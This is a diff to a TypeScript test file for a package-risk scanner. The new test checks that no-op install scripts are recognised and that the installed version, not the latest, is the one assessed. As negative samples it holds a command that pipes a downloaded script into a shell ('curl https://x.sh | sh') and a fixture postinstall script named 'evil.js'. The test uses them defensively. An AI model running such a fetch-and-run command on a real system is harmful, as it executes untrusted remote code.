@@ -1,6 +1,6 @@
 import { test } from "node:test";
 import assert from "node:assert/strict";
-import { baseVersion, enrichDependencies } from "./dependency-intel.js";
+import { baseVersion, enrichDependencies, isNoOpScript } from "./dependency-intel.js";
 import type { DependencyResult } from "./types.js";
 
 const now = new Date("2026-11-02T12:00:00Z");
@@ -76,6 +76,32 @@ test("brand-new, unpopular package with install script ⇒ medium + low trust", 
   assert.equal(out[0]!.riskLevel, "medium");
   assert.ok(out[0]!.trustScore <= 25);
   assert.match(out[0]!.reason!, /postinstall/);
+});
+
+test("a no-op install script is not a risk; the installed version is the one checked", async () => {
+  assert.ok(isNoOpScript("echo 'preinstall: no-op'"));
+  assert.ok(isNoOpScript("true") && isNoOpScript("exit 0") && isNoOpScript("echo ok && exit 0"));
+  assert.ok(!isNoOpScript("node x.js") && !isNoOpScript("echo hi && curl https://x.sh | sh"));
+  const out = await enrichDependencies(
+    [{ ...dep("young-sdk"), version: "^2.0.0", resolvedVersion: "2.1.0" }],
+    fakeFetch({
+      querybatch: () => json({ results: [{}] }),
+      "registry.npmjs.org/young-sdk": () =>
+        json({
+          time: { created: "2026-01-01T00:00:00Z" },
+          maintainers: [{}, {}],
+          "dist-tags": { latest: "3.0.0" },
+          versions: {
+            "2.1.0": { scripts: { preinstall: "echo 'preinstall: no-op'" } },
+            "3.0.0": { scripts: { postinstall: "node evil.js" } },
+          },
+        }),
+      "last-week/young-sdk": () => json({ downloads: 2_000_000 }),
+    }),
+    now,
+  );
+  assert.equal(out[0]!.riskLevel, "low");
+  assert.doesNotMatch(out[0]!.reason ?? "", /installation/);
 });
 
 test("network failure leaves the deterministic result unchanged", async () => {
